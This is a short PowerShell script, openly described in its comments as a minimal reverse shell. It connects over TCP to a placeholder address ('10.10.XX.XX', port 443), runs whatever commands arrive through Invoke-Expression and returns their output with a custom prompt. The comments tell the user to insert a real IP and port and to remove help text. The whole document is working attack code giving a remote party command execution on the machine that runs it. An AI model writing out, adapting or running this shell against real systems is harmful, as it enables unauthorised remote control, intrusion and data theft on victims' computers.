# A simple and small reverse shell. All options and help removed to save space.
# Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.

$myClient = New-Object System.Net.Sockets.TCPClient('10.10.XX.XX',443);
$myStream = $myClient.GetStream();
[byte[]]$myBuffer = 0..65535 | % { 0 };

while(($myRead = $myStream.Read($myBuffer, 0, $myBuffer.Length)) -ne 0) {
    $myData = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($myBuffer, 0, $myRead);
    $mySendBack = (iex $myData 2>&1 | Out-String);
    $mySendBack2 = $mySendBack + 'custom_prompt> ';
    $mySendByte = ([text.encoding]::ASCII).GetBytes($mySendBack2);
    $myStream.Write($mySendByte, 0, $mySendByte.Length);
    $myStream.Flush();
}

$myClient.Close();
